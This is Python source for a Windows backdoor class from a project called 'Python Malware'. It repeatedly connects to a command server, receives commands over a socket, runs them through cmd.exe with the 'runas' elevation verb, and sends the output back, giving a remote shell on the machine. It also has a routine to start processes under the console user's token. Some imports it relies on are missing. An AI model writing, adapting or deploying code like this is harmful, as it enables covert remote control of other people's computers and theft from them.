from local_libs.config import Config
import win32comext.shell.shell as shell
import socket
import time
import os

class Backdoor:
    def __init__(self):
        self.commands_log_filepath = r"C:\Users\User\Desktop\backdoor_log.txt"
        self.config_filepath = r"D:\PROJECTS\PycharmProjects\Python Malware\config.json"
        self.config = Config.initialize(self.config_filepath)

        self.s = None
        self.server_ip = "127.0.0.1"
        self.server_port = 8080

    def connect_to_server(self):
        while True:
            try:
                self.s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                self.s.connect((self.server_ip, self.server_port))
                break
            except:
                continue

    def run(self):
        self.connect_to_server()
        # self.execute_admin_cmd("chcp 65001")

        while True:
            try:
                received_command = self.s.recv(1024 * 4).decode("utf-8")
                self.handle_command(received_command)
            except ConnectionError:
                self.connect_to_server()
            except socket.error:
                continue

    def handle_command(self, command):
        if command == "start shell":
            self.send_reverse_msg("")
        elif command == "hello":
            pass
        elif command[:2] == "cd":
            try:
                os.chdir(command[3:])
                self.send_reverse_msg("")
            except Exception as error:
                self.send_reverse_msg(f"Error: {error}\n")
        else:
            try:
                self.execute_admin_cmd(command)
                time.sleep(0.5)
                cmd_output = self.get_cmd_output()
                self.send_reverse_msg(f"{cmd_output}\nSuccessfully executed\n")
            except Exception as error:
                self.send_reverse_msg(f"Error: {error}\n")

    def send_reverse_msg(self, msg):
        self.s.send(f"{msg}{os.getcwd()} >> ".encode("utf-8"))

    def execute_user_cmd(self, command):
        console_session_id = win32ts.WTSGetActiveConsoleSessionId()
        console_user_token = win32ts.WTSQueryUserToken(console_session_id)

        environment = win32profile.CreateEnvironmentBlock(console_user_token, False)

        startup_info = win32process.STARTUPINFO()
        startup_info.dwFlags = win32process.STARTF_USESHOWWINDOW
        startup_info.wShowWindow = win32con.SW_NORMAL

        win32process.CreateProcessAsUser(console_user_token,
                                         fr"{command}",
                                         None,
                                         None,
                                         None,
                                         0,
                                         win32con.NORMAL_PRIORITY_CLASS,
                                         environment,
                                         None,
                                         startup_info)

    def execute_admin_cmd(self, command):
        shell.ShellExecuteEx(lpVerb="runas", lpFile="cmd.exe",
                             lpParameters=fr"/c {command} > {self.commands_log_filepath}")

    def get_cmd_output(self):
        with open(self.commands_log_filepath) as f:
            return f.read()

class Commands:
    pass

